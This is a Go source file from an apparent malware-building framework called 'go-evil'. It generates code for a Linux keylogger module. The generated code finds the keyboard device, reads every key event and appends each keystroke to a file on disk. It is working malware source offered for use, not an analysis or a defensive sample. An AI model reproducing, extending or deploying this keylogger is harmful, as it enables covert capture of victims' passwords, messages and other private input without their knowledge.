package keylogger

import (
	"github.com/s9rA16Bf4/go-evil/utility/structure/functions"
	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
)

func linuxInstance(func_name string, data_object *json.Json_t) {
	data_object.Add_go_function(functions.Go_func_t{
		Name:           func_name,
		Func_type:      "",
		Return_type:    "",
		Part_of_struct: "",
		Parameters:     []string{"repr_1 []int"},
		Gut: []string{
			"path := spine.variable.get(spine.alpha.construct_string(repr_1))",
			"keyboard := keylogger.FindKeyboardDevice()",
			"fmt.Println(keyboard)",
			"key, err := keylogger.New(keyboard)",
			"if err != nil {",
			"spine.log(err.Error())",
			"return",
			"}",
			"defer key.Close()",
			"file, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)",
			"if err != nil {",
			"spine.log(err.Error())",
			"return",
			"}",
			"defer file.Close()",
			"",
			"for event := range key.Read() {",
			"fmt.Println(event, \"hello\")",
			"switch event.Type {",
			"case keylogger.EvKey:",
			"fmt.Println(keylogger.EvKey)",
			"if _, err = file.WriteString(event.KeyString()); err != nil {",
			"spine.log(err.Error())",
			"return",
			"}",
			"break",
			"}",
			"}",
		},
	})

	data_object.Add_go_imports([]string{"github.com/MarinX/keylogger", "os", "fmt"})
}
